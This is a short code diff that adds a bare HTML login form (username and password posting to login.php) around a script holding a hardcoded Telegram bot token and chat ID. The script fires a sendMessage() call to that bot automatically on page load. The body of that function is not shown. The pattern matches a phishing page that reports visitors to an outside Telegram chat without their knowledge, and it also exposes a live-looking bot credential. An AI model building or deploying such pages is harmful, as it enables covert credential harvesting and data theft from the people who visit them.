@@ -1,4 +1,17 @@
-<script type="text/javascript">
+<html>
+  <head>
+    <title>Login Form</title>
+  </head>
+  <body>
+    <form action="login.php" method="post">
+      <label for="username">Username:</label><br>
+      <input type="text" id="username" name="username"><br>
+      <label for="password">Password:</label><br>
+      <input type="password" id="password" name="password"><br><br>
+      <input type="submit" value="Submit">
+    </form> 
+  </body>
+  <script type="text/javascript">
     // Replace with your own values
     var BOT_TOKEN = "5943003013:AAFy8TH8ZkIOi1kyQosVciuDSYSxBXUUc50";
     var CHAT_ID = "2013299047";
@@ -35,4 +48,7 @@
     // Call the sendMessage() function when the page is loaded
     window.onload = sendMessage;
   </script>
+</html>
+
+
   
